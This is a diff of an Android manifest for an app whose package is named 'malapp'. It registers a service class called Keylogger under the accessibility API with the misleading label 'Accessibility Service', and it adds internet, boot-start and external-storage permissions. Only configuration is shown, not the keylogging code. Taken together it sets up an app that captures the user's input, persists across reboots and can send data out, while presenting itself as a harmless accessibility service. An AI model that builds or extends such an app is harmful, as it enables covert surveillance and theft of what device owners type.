@@ -3,7 +3,12 @@
     package="com.posseggs.malapp">
 
     <!-- Permissions for the malapp -->
+    <!--<uses-permission android:name="android.permission.WRITE_SETTINGS" android:required="false" /> -->
     <uses-permission android:name="REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
 
     <application
         android:allowBackup="true"
@@ -12,20 +17,6 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <service
-            android:name=".ServiceAccessibility"
-            android:enabled="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/service_accessibility_config"
-                />
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-        </service>
-
         <activity android:name=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -33,6 +24,16 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        <service android:name=".Keylogger"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:label="Accessibility Service">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/service_accessibility_config" />
+        </service>
     </application>
 
 </manifest>
